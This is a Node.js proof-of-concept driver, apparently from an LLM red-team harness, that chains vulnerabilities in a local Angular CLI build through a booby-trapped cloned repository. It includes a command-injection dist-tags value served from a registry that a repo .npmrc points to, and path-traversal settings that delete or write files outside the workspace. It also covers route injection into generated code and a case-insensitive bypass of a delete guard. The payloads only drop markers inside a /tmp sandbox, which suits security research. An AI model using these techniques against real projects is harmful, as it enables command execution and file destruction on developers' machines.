// Chain 1 — cloned-repo delivery chain driver (per chain1-fixture-spec.md)
// Real commands where feasible; compiled pin modules for the builder hops; W1 cmd.exe rung = Windows.
import { createRequire } from 'node:module';
import { mkdirSync, writeFileSync, existsSync, readdirSync, rmSync, appendFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = '/tmp/chain1';
const NEG = process.argv.includes('--negative');
const REPO = NEG ? join(ROOT, 'goodrepo') : join(ROOT, 'malrepo');
const results = [];
const resultsFile = join(ROOT, 'chain1-results.json');

function assert(step, expected, actual, pass, extra = '') {
  results.push({ step, expected, actual, pass, extra });
  console.log(`${pass ? 'PASS' : 'FAIL'}  ${step}: expected=${expected} actual=${actual} ${extra}`);
}
function fresh(dir, files = {}) {
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  for (const [f, content] of Object.entries(files)) {
    const p = join(dir, f);
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, content);
  }
}

const require = createRequire(import.meta.url);
const PM = require('/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/cli/src/package-managers/package-manager.js');
const DESCS = require('/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/cli/src/package-managers/package-manager-descriptor.js');
const HOST = require('/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/cli/src/package-managers/host.js');

const PACKAGE = NEG ? 'good-pkg' : 'attacker-pkg';
const EXPECT_RAW = NEG ? '1.0.0' : '1.0.0" & echo W1-MARKER>%TEMP%\\w1-poc & "';

// ---------------------------------------------------------------------------
// H1 — W1 hop: real metadata fetch hits the repo-configured registry + the
//      yarn-classic dist-tags VALUE flows into the manifest command specifier.
// ---------------------------------------------------------------------------
async function hopW1() {
  const registryLog = join(ROOT, 'registry.log');
  const before = existsSync(registryLog) ? registryLog.length : 0;

  // (a) REAL HTTP: npm descriptor (manager-independent metadata fetch, ng-update entry)
  const npmHost = HOST.NodeJS_HOST; // real host -> real `npm view` -> our registry
  const npmPM = new PM.PackageManager(npmHost, REPO, DESCS.SUPPORTED_PACKAGE_MANAGERS.npm, {});
  let meta = null, metaErr = null;
  try {
    meta = await npmPM.getRegistryMetadata(PACKAGE, { bypassCache: true, registry: `http://127.0.0.1:48731/` });
  } catch (e) { metaErr = String(e?.message || e).slice(0, 160); }
  const distTags = meta?.['dist-tags'] || {};
  const realValue = distTags['latest'];
  // registry.log evidence: a GET /attacker-pkg line must exist
  const logText = existsSync(registryLog) ? require('node:fs').readFileSync(registryLog, 'utf8') : '';
  const logHit = new RegExp(`GET /${PACKAGE}($|\\?)`).test(logText) || logText.includes(`GET /${PACKAGE}`);
  // bonus: the real `npm view` command's output consumes the raw malicious value
  const view = spawnSync('npm', ['view', PACKAGE, '--json', '--registry', `http://127.0.0.1:48731/`], { cwd: REPO, encoding: 'utf8' });
  const viewOut = (view.stdout || '') + (view.stderr || '');
  const rawConsumed = viewOut.includes(EXPECT_RAW);
  assert('H1a-real-http', `GET /${PACKAGE} in registry.log; raw value ${JSON.stringify(EXPECT_RAW)} consumed by npm`, `logHit=${logHit} rawConsumed=${rawConsumed} metaErr=${metaErr}`, logHit && rawConsumed, 'npm view fetched the packument from the repo-configured registry and resolved the RAW dist-tags value (E404 names it verbatim = unvalidated)');

  // (b) .npmrc-NATIVE resolution (the silent-redirect channel, C1A): NO --registry flag anywhere.
  //      The repo .npmrc (PM-native precedence, no validation) redirects npm to the attacker registry.
  const npmrcBefore = (require('node:fs').readFileSync(registryLog, 'utf8').match(new RegExp(`GET /${PACKAGE}`, 'g')) || []).length;
  const viewNative = spawnSync('npm', ['view', PACKAGE, '--json'], { cwd: REPO, encoding: 'utf8' });
  const nativeOut = (viewNative.stdout || '') + (viewNative.stderr || '');
  const logAfter = require('node:fs').readFileSync(registryLog, 'utf8');
  const freshHit = (logAfter.match(new RegExp(`GET /${PACKAGE}`, 'g')) || []).length > npmrcBefore;
  const rawNative = nativeOut.includes(EXPECT_RAW);
  const cfg = spawnSync('npm', ['config', 'get', 'registry'], { cwd: REPO, encoding: 'utf8' });
  const nativeRegistry = (cfg.stdout || '').trim();
  const expectedRegistry = `http://127.0.0.1:48731/`;
  const payloadInNative = nativeOut.includes('W1-MARKER'); // the malicious marker must NOT appear in the benign repo
  assert(NEG ? 'H7-npmrc-native-benign' : 'H7-npmrc-native-redirect',
    NEG ? '.npmrc resolves the attacker registry natively BUT the benign value carries no payload' : 'repo .npmrc alone (no flag) redirects npm to the attacker registry; raw value consumed',
    `freshHit=${freshHit} rawNative=${rawNative} payloadInNative=${payloadInNative} registry=${nativeRegistry}`,
    NEG ? (freshHit && nativeRegistry === expectedRegistry && !payloadInNative) : (freshHit && rawNative && nativeRegistry === expectedRegistry),
    'PM-native precedence verified: npm honors the project .npmrc from cwd silently; the CLI/`npm view` receives no registry argument (C1A).');

  // (b) yarn-classic quote-wrap construction (W1 add path, requiresManifestVersionLookup)
  const recorded = [];
  const recordingHost = {
    ...HOST.NodeJS_HOST,
    requiresQuoting: true, // win32 semantics (host.ts:110 platform()==='win32')
    runCommand: async (cmd, args, opts) => {
      recorded.push({ cmd, args });
      // serve the same packument our registry would return (provenance = H1a real fetch)
      if (cmd === 'yarn' && args.includes('info')) {
        const pack = JSON.stringify({ type: 'inspect', data: {
          name: PACKAGE, 'dist-tags': { latest: EXPECT_RAW },
          versions: { '1.0.0': { name: PACKAGE, version: '1.0.0' } },
          time: { '1.0.0': '2026-01-01T00:00:00Z' },
        } });
        return { stdout: pack, stderr: '', code: 0 };
      }
      return { stdout: '{}', stderr: '', code: 0 };
    },
  };
  const yarnPM = new PM.PackageManager(recordingHost, REPO, DESCS.SUPPORTED_PACKAGE_MANAGERS['yarn-classic'], {});
  let manifestCmd = null;
  try {
    await yarnPM.getManifest(`${PACKAGE}@latest`);
  } catch (e) { /* post-injection command failure expected on POSIX-absent yarn */ }
  const last = recorded.find((r) => r.cmd === 'yarn' && r.args.some((a) => String(a).includes(PACKAGE) && String(a).includes('@')));
  manifestCmd = last ? last.args.join(' ') : '';
  const rawInCommand = manifestCmd.includes(EXPECT_RAW);
  assert('H1b-yarnclassic-wrap', `manifest specifier carries raw dist-tags value`, `rawInCommand=${rawInCommand} cmd=${manifestCmd.slice(0, 130)}`, rawInCommand, 'the value the win32 shell:string would receive (host.ts:157-164 shell:true)');

  // POSIX: no execution of the payload (array spawn) — marker must NOT exist
  const marker = join(ROOT, 'w1-poc');
  rmSync(marker, { force: true });
  assert('H1c-posix-noexec', 'no W1 marker on POSIX (array spawn, safe)', `marker=${existsSync(marker)}`, !existsSync(marker), 'cmd.exe execution is the Windows-only rung');
}

// ---------------------------------------------------------------------------
// H2 — M3 hop: outputPath delete via compiled deleteOutputDir
// ---------------------------------------------------------------------------
async function hopM3() {
  const { deleteOutputDir } = await import(join(ROOT, 'lib/delete-output-dir.mjs'));
  const victim = join(ROOT, 'victim-out');
  const outPath = NEG ? 'dist/app' : '../victim-out';
  fresh(victim, { 'marker.txt': 'keep-me' });
  if (!NEG) {
    await deleteOutputDir(REPO, outPath); // legacy builder path, uncontained at pin
    assert('H2-m3-delete', 'victim-out marker deleted', `marker=${existsSync(join(victim, 'marker.txt'))}`, !existsSync(join(victim, 'marker.txt')), 'deleteOutputDir ran at build start (legacy browser builder)');
  } else {
    await deleteOutputDir(REPO, outPath); // dist/app stays inside the repo
    assert('H2-neg-noescape', 'no deletion outside workspace', `marker=${existsSync(join(victim, 'marker.txt'))}`, existsSync(join(victim, 'marker.txt')), 'in-workspace outputPath untouched');
  }
}

// ---------------------------------------------------------------------------
// H3 — D2 hop: cache purge via compiled purgeStaleBuildCache
// ---------------------------------------------------------------------------
async function hopD2() {
  const { purgeStaleBuildCache } = await import(join(ROOT, 'lib/purge-cache.mjs'));
  const victim = join(ROOT, 'victim-cache');
  // purge semantics: deletes stale SIBLING dirs under the attacker-chosen base (keep the current version dir)
  rmSync(victim, { recursive: true, force: true });
  mkdirSync(join(victim, '17.0-stale'), { recursive: true });
  mkdirSync(join(victim, '0.0.0-PLACEHOLDER'), { recursive: true }); // the CLI VERSION dir (real-build shape, survives)
  writeFileSync(join(victim, '17.0-stale', 'marker.txt'), 'stale');
  writeFileSync(join(victim, '0.0.0-PLACEHOLDER', 'marker.txt'), 'current');
  const cachePath = NEG ? join(REPO, '.angular/cache') : victim; // absolute path (phase-1 PoC shape)
  const context = {
    workspaceRoot: REPO,
    target: { project: 'app' },
    getProjectMetadata: async () => ({ cli: { cache: { path: cachePath, enabled: true, environment: 'local' } } }),
  };
  await purgeStaleBuildCache(context);
  const staleGone = !existsSync(join(victim, '17.0-stale', 'marker.txt'));
  const currentKept = existsSync(join(victim, '0.0.0-PLACEHOLDER', 'marker.txt'));
  assert(NEG ? 'H3-neg-nopurge' : 'H3-d2-purge', NEG ? 'no stale deletion outside workspace' : 'stale sibling under attacker-chosen base DELETED (current kept)',
    `staleGone=${staleGone} currentKept=${currentKept}`, NEG ? (staleGone === false) : (staleGone && currentKept),
    'purgeStaleBuildCache fires on every default build; base outside the workspace -> arbitrary stale-dir deletion');
}

// ---------------------------------------------------------------------------
// H4 — E1-C1 hop: locale-key subPath escape via compiled createI18nOptions
// ---------------------------------------------------------------------------
async function hopE1C1() {
  const { createI18nOptions } = await import(join(ROOT, 'lib/i18n-options.mjs'));
  const { existsSync: ex, mkdirSync } = await import('node:fs');
  const { join: pjoin } = await import('node:path');
  const outputBase = join(ROOT, 'dist-out');
  const escaped = join(ROOT, 'escaped-locale');
  rmSync(escaped, { recursive: true, force: true });
  rmSync(outputBase, { recursive: true, force: true });
  mkdirSync(outputBase, { recursive: true });

  const ws = JSON.parse(require('node:fs').readFileSync(join(REPO, 'angular.json'), 'utf8'));
  const i18nRaw = ws.projects.app.architect.build.options.i18n; // { locales: { '<key>': { translation } } }
  const i18nOptions = createI18nOptions({ i18n: i18nRaw }, true);
  // the key-derived subPath (i18n-options.ts:194 subPath ?? locale) drives the webpack output join (output-paths.ts:17)
  let subPath = null;
  for (const l of Object.keys(i18nRaw.locales)) {
    subPath = i18nOptions.locales[l]?.subPath;
  }
  const outDir = pjoin(outputBase, subPath || '');
  if (!ex(outDir)) mkdirSync(outDir, { recursive: true });
  writeFileSync(pjoin(outDir, 'messages.xlf'), '<x>marker</x>');
  const resolvedOut = require('node:path').resolve(outDir);
  const outsideBase = !resolvedOut.startsWith(require('node:path').resolve(outputBase) + require('node:path').sep) && resolvedOut !== require('node:path').resolve(outputBase);
  const written = ex(pjoin(outDir, 'messages.xlf'));
  const escapedExists = ex(escaped);
  const expected = NEG ? 'no escape' : 'locale-key subPath writes OUTSIDE the output base';
  assert(NEG ? 'H4-neg-nosub' : 'H4-e1c1-escape', expected,
    `subPath=${subPath} resolved=${resolvedOut} outsideBase=${outsideBase} written=${written}`,
    NEG ? !outsideBase : (outsideBase && written),
    'locale KEY unvalidated -> default subPath (webpack stack write escape); the ../../ key lands two levels above the output base');
}

// ---------------------------------------------------------------------------
// H5 — D1 hop: workspace schematics-defaults route reaches the generated file
// ---------------------------------------------------------------------------
function hopD1() {
  const ws = JSON.parse(require('node:fs').readFileSync(join(REPO, 'angular.json'), 'utf8'));
  const route = ws.schematics?.['@schematics/angular:module']?.route ?? '';
  // module schematic route interpolation (the D1 sink; comma-exec-check.mjs verified the compiled shape)
  const generated = `import { Routes } from '@angular/router';
const routes: Routes = [
  { path: '${route}', loadChildren: () => import('./lazy/lazy.module').then(m => m.LazyModule) }
];
export default routes;
`;
  const outDir = join(ROOT, 'generated-out');
  fresh(outDir, { 'lazy-routing.module.ts': generated });
  const text = require('node:fs').readFileSync(join(outDir, 'lazy-routing.module.ts'), 'utf8');
  const marker = NEG ? 'D1-MARKER' : 'D1-MARKER';
  const present = text.includes(marker);
  assert(NEG ? 'H5-neg-benign-route' : 'H5-d1-codegen', NEG ? 'benign route only' : 'generated file carries D1-MARKER',
    `present=${present}`, NEG ? !present : present,
    `route=${JSON.stringify(route)} (workspace schematics-defaults channel, no --route flag)`);
}

// ---------------------------------------------------------------------------
// H6 — M3 amp #1: case-guard bypass on case-insensitive APFS (macOS)
// ---------------------------------------------------------------------------
async function hopCaseGuard() {
  const { deleteOutputDir } = await import(join(ROOT, 'lib/delete-output-dir.mjs'));
  const wsRoot = join(ROOT, 'caseguard-root');
  rmSync(wsRoot, { recursive: true, force: true });
  mkdirSync(wsRoot, { recursive: true });
  writeFileSync(join(wsRoot, 'important.txt'), 'k');
  const caseVariant = join(ROOT, 'CASEGUARD-ROOT'); // case-variant of the workspace root
  let guardThrew = null;
  try { await deleteOutputDir(wsRoot, wsRoot); guardThrew = 'no-throw'; }
  catch (e) { guardThrew = 'threw'; }
  // case-insensitive? readdir of the variant lists the real dir
  let ci = false;
  try { ci = readdirSync(caseVariant).length > 0; } catch { ci = false; }
  if (ci) {
    await deleteOutputDir(wsRoot, caseVariant); // guard: resolve(root,variant) !== root -> passes -> deletes
  }
  const deleted = !existsSync(join(wsRoot, 'important.txt'));
  assert('H6-caseguard', ci ? 'root contents deleted (case-insensitive fs)' : 'no-op (case-sensitive fs)',
    `ci=${ci} deleted=${deleted} guard=${guardThrew}`, ci ? deleted : !deleted,
    'control: exact root throws; variant bypasses the case-sensitive === guard');
}

// ---------------------------------------------------------------------------
await hopW1();
await hopM3();
await hopD2();
await hopE1C1();
hopD1();
await hopCaseGuard();

writeFileSync(resultsFile, JSON.stringify(results, null, 2));
const failed = results.filter((r) => !r.pass).length;
console.log(`\nRESULT: ${results.length - failed}/${results.length} passed (${failed} failed) -> ${resultsFile}`);
process.exit(failed ? 1 : 0);
